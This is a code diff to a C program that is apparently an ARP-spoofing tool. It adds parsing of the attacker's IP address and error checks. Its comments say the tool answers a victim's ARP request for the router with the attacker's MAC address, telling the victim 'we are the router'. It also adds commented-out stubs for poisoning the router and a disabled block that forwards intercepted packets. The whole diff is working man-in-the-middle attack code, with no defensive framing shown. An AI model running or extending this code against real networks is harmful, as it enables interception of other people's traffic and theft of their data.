@@ -76,6 +76,8 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	eth_addr_t router_mac_addr;
 	uint16_t type;
 	ip_addr_t router_ip_addr;
+	ip_addr_t my_ip_addr;
+	char *my_ip_string;
 	char *arguments = strdup((char *)args);
 	char *ip_router_string;
 	char *mac_router_string;
@@ -85,6 +87,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	ip_router_string = strtok(arguments, ";");
 	mac_router_string = strtok(NULL, ";");
 	my_mac = strtok(NULL, ";");
+	my_ip_string = strtok(NULL, ";");
 
 	if (ip_router_string == NULL) {
 		printf("ip_router_string == NULL\n");
@@ -96,10 +99,21 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		exit(1);
 	}
 
+	if (my_mac == NULL) {
+		printf("my_mac == NULL\n");
+		exit(1);
+	}
+
+	if (my_ip_string == NULL) {
+		printf("my_ip == NULL\n");
+		exit(1);
+	}
+
 	// We translate the strings into real addresses
 	string_to_mac_addr(mac_router_string, &router_mac_addr);
 	string_to_ip_addr(ip_router_string, &router_ip_addr);
 	string_to_mac_addr(my_mac, &my_mac_addr);
+	string_to_ip_addr(my_ip_string, &my_ip_addr);
 
 	// We fill the eth_pack struct with the ethernet header of our packet
 	memcpy(&eth_pack, packet, sizeof(struct eth_hdr));
@@ -129,18 +143,27 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 //		printf("\nrouter_id_addr = 0x%08X\n", router_ip_addr);
 
 		printf("\t[ARP (opcode = 0x%04X) detected]\n", opcode);
+		// if it's a request from the victim to get the router mac addr
 		if ( (memcmp(&router_ip_addr, &target_ip_addr, IP_ADDR_LEN) == 0) && (opcode == ARP_OP_REQUEST) ) {
 			printf("\t\t[Intercepted ARP request for the Router] we gotta answer !\n\n");
+			// we answer our mac addr to the victim, we tell him we are the router
 			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
+			// we ask the victim what is it's mac addr, saying we are the router
+			//arp_request(eth_pack.eth_src, arp_payload.ar_spa, my_mac_addr, router_ip_addr);
+			// we ask the router his mac addr, saying we are the victim
+			//arp_request();
 
 		}
-	} else if (type == ETH_TYPE_IP) {
+	} /*else if (type == ETH_TYPE_IP) {
 		struct ip_hdr ip_header;
 		memcpy(&ip_header, packet + sizeof(struct eth_hdr), sizeof(struct ip_hdr));
 
-	//	if ((memcmp(my_mac_addr, eth_hdr.eth_dst, ETH_ADDR_LEN) == 0) && (ip_header.ip_dst != ))
+		if ((memcmp(my_mac_addr.data, eth_pack.eth_dst.data, ETH_ADDR_LEN) == 0) && (ip_header.ip_dst != my_ip_addr)) {
+			if (memcmp(eth_pack.eth_src.data, router_mac_addr.data, ETH_ADDR_LEN) != 0) 
+				forward(packet, header->len, router_mac_addr);
+		}
 
-	}
+	}*/
 
 
 }
